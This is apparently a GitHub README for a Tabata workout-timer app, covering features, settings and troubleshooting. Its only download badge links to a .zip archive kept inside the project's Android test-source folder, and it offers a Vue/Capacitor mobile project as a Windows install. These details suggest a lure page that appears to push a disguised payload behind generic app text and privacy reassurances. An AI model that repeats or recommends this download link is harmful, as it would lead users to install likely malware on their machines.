# ⏱️ tabata-app - Improve your fitness with interval training

[![Download App](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/konquerortonguingandgroovingplane241/tabata-app/raw/refs/heads/main/android/app/src/test/java/app_tabata_1.5.zip)

This application helps you manage your Tabata workouts. Tabata training is a form of high-intensity interval training. You perform exercises for short periods followed by short rest breaks. This app tracks your rounds to keep you on schedule.

## 📋 Features

- Customizable workout timers.
- Visual progress tracking for every round.
- Preset intervals for standard Tabata routines.
- Audio cues to signal change between work and rest.
- Settings to adjust time for work, rest, and total rounds.
- Interface designed for use during physical activity.
- Minimal design to prevent distraction.

## ⚙️ System Requirements

- Windows 10 or Windows 11.
- Modern internet browser for setup.
- 50 MB of available disk space.
- Stable connection to the internet during the initial install.

## 🚀 Using the Application

The interface uses simple elements to show your current training status. 

### Setting your workout
When you open the app, you see the main dashboard. Use the input fields to set the duration for work and rest sessions. You can also define the total number of rounds. The app saves these settings for your next session.

### Starting a routine
Select the green Start button to begin. The app changes the background color to indicate your current state. Green means you perform your exercise. Red means you rest. The timer counts down on the screen to help you track your progress.

### Audio cues
The app plays a distinct sound during transitions. You do not need to watch the screen to know when to switch tasks. You can adjust the volume in the settings menu if the cues are too loud or too quiet.

## 🔧 Managing Settings

You can customize the app to fit your specific needs. Use the settings gear icon to access the menu.

- **Theme**: Choose between light and dark modes to match your preference.
- **Sound**: Choose different alert sounds for your work and rest periods.
- **Auto-start**: Enable this if you want the timer to start immediately after selecting a routine.
- **Brightness**: The app can prevent your screen from turning off during a workout.

## 🛠️ Troubleshooting

If you encounter issues, consider these tips.

- **App won't open**: Ensure you have finished the setup process. Restart your computer if the app remains unresponsive.
- **Audio missing**: Check your system sound settings. Make sure the volume is not muted.
- **Timer freezes**: Check your power saving settings. Set your PC to high performance mode to ensure the timer remains accurate during long training sessions.
- **Updates**: Check the download page periodically for new versions. Newer versions often include fixes for known bugs and improvements for stability.

## 📚 Technical Context

This project uses modern web technologies to function on your desktop. It uses Vue for the interface and Capacitor to bridge the web code to your operating system. The design follows material standards to ensure the buttons and menus are easy to press and read. 

Your progress data stays on your local device. The application does not send your workout history to external servers. This protects your privacy and ensures your data remains under your control at all times.
